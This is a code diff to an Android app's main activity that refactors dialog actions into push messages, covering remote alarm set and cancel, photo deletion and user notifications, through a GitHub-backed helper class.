@@ -187,13 +187,9 @@ public class MainActivity extends AppCompatActivity implements SearchView.OnQuer
             public void run() {
                 try  {
                     GitRobot gitRobot = new GitRobot();
-                 //   gitRobot.setApiUrl("https://api.github.com");
-                  // gitRobot.setUserId("pfariseev");
                     Log.d("--", "File: " + finalFile.getName());
                     Log.d("--", "File.getAbsolutePath: " + finalFile.getParent());
                     gitRobot.updateSingleContent(contex, "sprkpmes_token","Token", finalFile.getName(), finalFile.getParent()+"/cache","update", null);
-                    //gitRobot.updateSingleContent(contex, "sprkpmes_token","Token", finalFile.getName(), finalFile.getParent()+"/cache","list", null);
-                   // gitRobot.sendPush("hh!");
                     editor.putBoolean("upLoadToServer",true);
                     editor.commit();
                 } catch (Exception e) {
@@ -445,10 +441,11 @@ public class MainActivity extends AppCompatActivity implements SearchView.OnQuer
                 return false;
         }
     }
-    public static void prompt_sendMessage(Context context) {
+    void prompt_sendMessage(Context context) {
         LayoutInflater li = LayoutInflater.from(context);
         View promptsView = li.inflate(R.layout.prompt_radiobutton, null);
         android.app.AlertDialog.Builder alertDialogBuilder = new android.app.AlertDialog.Builder(context);
+        GitRobot gitRobot = new GitRobot();
         alertDialogBuilder.setView(promptsView);
         alertDialogBuilder
                 .setCancelable(false)
@@ -459,15 +456,18 @@ public class MainActivity extends AppCompatActivity implements SearchView.OnQuer
                                 ComponentName receiver = new ComponentName(context, EternalService.Alarm.class);
                                 switch (rg.getCheckedRadioButtonId()) {
                                     case R.id.radioButton_one:
-                                        pm.setComponentEnabledSetting(receiver, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
-                                        EternalService.Alarm.setAlarm(context);
+                                        send("AlarmForceSet", "data");
+                                        break;
                                     case R.id.radioButton_two:
-                                        pm.setComponentEnabledSetting(receiver, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-                                        EternalService.Alarm.cancelAlarm(context);
+                                        send("AlarmForceCancel", "data");
+                                        break;
                                     case R.id.radioButton_three:
-                                        savephoto.deletePholderWithFiles (context,"Photo");
-                                    default:
-                                        return;
+                                        send("DeleteAllPhotos", "data");
+                                        break;
+                                    case R.id.radioButton_four:
+                                        enterMessage ();
+                                        break;
+
                                 }
                              }
                         })
@@ -481,6 +481,21 @@ public class MainActivity extends AppCompatActivity implements SearchView.OnQuer
         alertDialog.show();
     }
 
+    void send (String message, String data) {
+        Thread thread = new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    GitRobot gitRobot = new GitRobot();
+                    gitRobot.sendPushMessage(getApplicationContext(), message, data);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+
+        });
+        thread.start();
+    }
     void enterMessage () {
         LayoutInflater li = LayoutInflater.from(this);
         View promptsView = li.inflate(R.layout.prompt, null);
@@ -492,30 +507,15 @@ public class MainActivity extends AppCompatActivity implements SearchView.OnQuer
                 .setPositiveButton("OK",
                         new DialogInterface.OnClickListener() {
                             public void onClick(DialogInterface dialog,int id) {
-                                Thread thread = new Thread(new Runnable() {
-                                    @Override
-                                    public void run() {
-                                        try {
-                                            GitRobot gitRobot = new GitRobot();
-                                                gitRobot.sendPush(userInput.getText().toString());
-                                        } catch (Exception e) {
-                                            e.printStackTrace();
-                                        }
-                                    }
-
-                                });
-                                thread.start();
+                                send(userInput.getText().toString(), "notification");
                             }
-
                         })
-
                 .setNegativeButton("Отмена",
                         new DialogInterface.OnClickListener() {
                             public void onClick(DialogInterface dialog,int id) {
                                 dialog.cancel();
                             }
                         });
-
         android.app.AlertDialog alertDialog = alertDialogBuilder.create();
         alertDialog.show();
     }
